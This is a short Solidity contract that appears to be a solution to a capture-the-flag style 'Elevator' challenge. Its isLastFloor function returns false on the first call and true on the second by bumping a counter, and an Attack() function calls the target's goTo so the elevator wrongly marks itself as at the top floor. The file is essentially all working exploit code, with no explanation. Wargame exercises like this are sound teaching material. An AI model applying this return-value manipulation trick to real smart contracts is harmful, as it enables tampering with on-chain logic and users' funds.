```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator  {
    function goTo(uint256 _floor) external ;
}

contract Building {
    bool public top = false;
    uint public counter = 2;
    IElevator public elevator;


    constructor(address _elevator){
        elevator = IElevator(_elevator);
    }

    function isLastFloor(uint256 floor) public returns (bool){
        if(floor % counter == 0){
            counter++;
            return false;
        }
        return true;
    }

    function Attack() public {
        elevator.goTo(counter);
    }
}
```